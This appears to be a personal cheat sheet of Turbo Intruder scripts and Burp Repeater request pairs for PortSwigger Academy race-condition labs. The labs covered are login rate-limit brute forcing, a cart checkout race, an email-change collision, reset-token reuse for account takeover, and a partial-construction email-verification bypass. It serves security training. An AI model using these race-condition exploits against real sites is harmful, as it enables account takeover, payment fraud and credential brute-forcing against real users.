# Race Conditions — Scripts

## 1. Rate Limit Bypass (Lab 1)
**Use case:** Brute force login without triggering lockout

**Setup:**
- Send `POST /login` to Turbo Intruder
- Set `username=carlos&password=%s` in request body
- Copy candidate password list to clipboard

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)

    for word in wordlists.clipboard:
        engine.queue(target.req, word, gate='1')

    engine.openGate('1')

def handleResponse(req, interesting):
    table.add(req)
```

**Success indicator:** One `302` response among all `200`s

---

## 2. Multi-Endpoint Race (Lab 2)
**Use case:** Bypass payment check by sneaking item into cart during checkout

**Setup:** Use Burp Repeater — no Turbo Intruder needed

**Requests to group and send in parallel:**
```
Tab 1: POST /cart/checkout
       Cookie: session=YOUR_SESSION

Tab 2: POST /cart
       Cookie: session=YOUR_SESSION
       productId=1&redir=PRODUCT&quantity=1
```

**Notes:**
- Do connection warming first with `GET /` tab
- Remove warming tab then send Tab 1 + Tab 2 in parallel
- Repeat if you get "insufficient funds"

---

## 3. Single-Endpoint Race (Lab 3)
**Use case:** Steal victim's email address by causing read/write collision

**Setup:** Use Burp Repeater — group these two and send in parallel

```
Tab 1: POST /my-account/change-email
       email=carlos@ginandjuice.shop

Tab 2: POST /my-account/change-email
       email=YOUR-ADDRESS@exploit-server.net
```

**Success indicator:** Confirmation email arrives at YOUR inbox but body says `carlos@ginandjuice.shop`

**Notes:**
- May need many attempts
- Check exploit server email client after each attempt
- Click the confirmation link to claim carlos's email

---

## 4. Time-Sensitive Attack (Lab 4)
**Use case:** Predict password reset token by generating same timestamp

**Setup:** Use Burp Repeater — group these two and send in parallel

```
Tab 1: POST /forgot-password
       username=wiener

Tab 2: POST /forgot-password
       username=carlos
```

**Steps after sending:**
1. Check exploit server email client
2. Copy the reset token from wiener's email
3. Craft carlos's reset URL manually:
```
/forgot-password?token=WIENERS_TOKEN&username=carlos
```
4. Visit the URL → reset carlos's password → log in → delete carlos

---

## 5. Partial Construction Race (Lab 5 — Expert)
**Use case:** Bypass email verification by hitting confirm endpoint during token initialization gap

**Setup:** Send `POST /register` to Turbo Intruder, mark `username` as `%s`

**Important values to update before running:**
- `Host:` → your current lab URL
- `phpsessionid=` → fresh session cookie from current lab session
- Username prefix → use a new one each attempt (old usernames may already be registered)

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)

    confirmRequest = '''POST /confirm?token[]= HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: phpsessionid=YOUR-FRESH-SESSION-COOKIE
Content-Length: 0

'''

    for attempt in range(20):
        currentAttempt = str(attempt)
        username = 'yourprefix' + currentAttempt

        # queue registration request
        engine.queue(target.req, username, gate=currentAttempt)

        # queue confirm requests to fire simultaneously
        for i in range(50):
            engine.queue(confirmRequest, gate=currentAttempt)

        # open gate — fires registration + all confirms at once
        engine.openGate(currentAttempt)

def handleResponse(req, interesting):
    table.add(req)
```

**Success indicator:** One `302` among the confirm requests

**Common issues:**
- All `400`s → check blank line at end of `confirmRequest` string
- All `403`s → timing is off, confirm firing too early or too late
- No `302` → try different username prefix (old ones already registered), refresh session cookie, or increase confirm requests to 60-70

---

## Turbo Intruder Quick Reference

| Setting | Value | Why |
|---------|-------|-----|
| `concurrentConnections` | `1` | Single-packet attack needs 1 connection |
| `engine` | `Engine.BURP2` | Enables HTTP/2 single-packet attack |
| `gate` | any string | Groups requests to fire simultaneously |

**How gates work:**
```python
engine.queue(req, payload, gate='mygate')  # hold this request
engine.openGate('mygate')                  # release ALL held requests at once
```

**Correct status check:**
```python
# Wrong
if req.status_code == "302":

# Correct
if req.status == 302:
```
